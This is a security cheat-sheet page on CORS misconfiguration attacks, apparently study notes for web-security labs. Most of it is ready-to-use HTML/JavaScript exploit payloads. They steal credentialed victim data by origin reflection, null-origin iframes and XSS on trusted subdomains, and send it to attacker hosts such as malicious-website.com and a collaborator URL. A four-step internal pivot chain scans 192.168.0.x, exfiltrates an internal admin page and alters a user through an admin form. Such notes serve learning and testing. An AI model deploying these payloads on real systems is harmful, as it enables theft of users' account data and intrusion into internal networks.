# Cross Origin Resource Sharing (CORS)

{% hint style="info" %}
A browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP).
{% endhint %}

## Overview

* **Same-origin policy (SOP)** - a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain.
* A controlled relaxation of the same-origin policy is possible using CORS.
* Various headers used in the response: `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, `Access-Control-Allow-Headers`, `Access-Control-Allow-Methods`.
* From a security perspective, the use of the wildcard (`*`) is restricted in the specification, as you cannot combine the wildcard with the cross-origin transfer of credentials (authentication, cookies, or client-side certificates).
* **Pre-Flight Checks** - a cross-origin request is preceded by a request using the `OPTIONS` method, and the CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request.

## CORS Vulnerability with Basic Origin Reflection

* Server-generated `Access-Control-Allow-Origin` header directly reflects the client-specified `Origin` header.
* Test whether the `Origin` header value is reflected arbitrarily in the response's `Access-Control-Allow-Origin` header, along with `Access-Control-Allow-Credentials: true`.

<details>

<summary><strong>Payload</strong></summary>

{% code lineNumbers="true" %}
```html
<html>
  <body>
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','https://url/accountDetails',true);
        req.withCredentials = true;
        req.send();

        function reqListener() {
            location='/log?key='+this.responseText;
        };
    </script>
  </body>
</html>
```
{% endcode %}

</details>

## CORS Vulnerability with Trusted Null Origin

### Errors Parsing Origin Headers

* Application might whitelist a set of domains and sub-domains (including non-existent ones) to compare (prefix/suffix comparison) against the client-specified `Origin` header (e.g. `normalwebsite.com`).
* Can be bypassed by using domains such as `hackernormalwebsite.com` or `normalwebsite.evil.com`.

### Whitelisted Null Origin Value

* The `Origin` header supports the value `null`. Browsers might send `null` in the `Origin` header in various situations:
  * Cross-origin redirects.
  * Requests from serialized data.
  * Requests using the `file:` protocol.
  * Sandboxed cross-origin requests.
* Application might whitelist `null` to support local development.
* Bypassed using a sandboxed cross-origin `iframe` request.

<details>

<summary><strong>Payload</strong></summary>

{% code lineNumbers="true" %}
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='https://malicious-website.com/log?key='+encodeURIComponent(this.responseText);
};
</script>
">
</iframe>
```
{% endcode %}

</details>

## CORS Vulnerability with Trusted Insecure Protocols

### Exploiting XSS via CORS Trust Relationships

* If an application trusts any of its sub-domains that is vulnerable to XSS, we can exploit CORS to get sensitive data from the application, since the sub-domain is trusted (whitelisted).

### Breaking TLS with Poorly Configured CORS

* An application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP.
* **Attack steps:**
  1. The victim user makes any plain HTTP request.
  2. The attacker injects a redirection to: `http://trusted-subdomain.vulnerable-website.com`.
  3. The victim's browser follows the redirect.
  4. The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: `https://vulnerable-website.com`.
  5. The victim's browser makes the CORS request, including the origin: `http://trusted-subdomain.vulnerable-website.com`.
  6. The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
  7. The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
* If an application trusts a vulnerable subdomain (XSS), we can exploit the CORS vulnerability in the actual application by leveraging the XSS vulnerability present in the trusted subdomain or URL. (Test for both HTTP and HTTPS protocols.)

<details>

<summary><strong>Payload</strong></summary>

{% code lineNumbers="true" %}
```html
<script>
document.location="http://trusted-vulnerable-website.com/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://cors-misconfigured-website.com/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://collaborator-server.com/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
{% endcode %}

</details>

## CORS Vulnerability with Internal Network Pivot Attack

{% hint style="info" %}
Used to pivot from a public-facing CORS-vulnerable application into scanning/exploiting an internal network the victim's browser can reach, but the attacker cannot.
{% endhint %}

### Step 1 - Internal IP Scanning

<details>

<summary><strong>Payload</strong></summary>

{% code lineNumbers="true" %}
```html
<script>
var q = [], collaboratorURL = 'http://$collaboratorPayload';

for(i=1;i<=255;i++) {
    q.push(function(url) {
        return function(wait) {
            fetchUrl(url, wait);
        }
    }('http://192.168.0.'+i+':8080'));
}

for(i=1;i<=20;i++){
    if(q.length)q.shift()(i*100);
}

function fetchUrl(url, wait) {
    var controller = new AbortController(), signal = controller.signal;
    fetch(url, {signal}).then(r => r.text().then(text => {
        location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
    }))
    .catch(e => {
        if(q.length) {
            q.shift()(wait);
        }
    });
    setTimeout(x => {
        controller.abort();
        if(q.length) {
            q.shift()(wait);
        }
    }, wait);
}
</script>
```
{% endcode %}

</details>

### Step 2 - Detect XSS on Discovered Internal Host

<details>

<summary><strong>Payload</strong></summary>

```html
<script>
function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
    fetch(url).then(r => r.text().then(text => {
        xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
    }))
}
fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
```

</details>

### Step 3 - Exfiltrate Internal Admin Page via XSS

<details>

<summary><strong>Payload</strong></summary>

{% code lineNumbers="true" %}
```html
<script>
function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
    fetch(url).then(r=>r.text().then(text=>
    {
        xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
    }
    ))
}
fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
```
{% endcode %}

</details>

### Step 4 - Auto-Create Admin User via XSS

<details>

<summary><strong>Payload</strong></summary>

{% code lineNumbers="true" %}
```html
<script>
function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url){
    fetch(url).then(r=>r.text().then(text=>
    {
    xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
    }
    ))
}
fetchUrl("http://$ip");
</script>
```
{% endcode %}

</details>
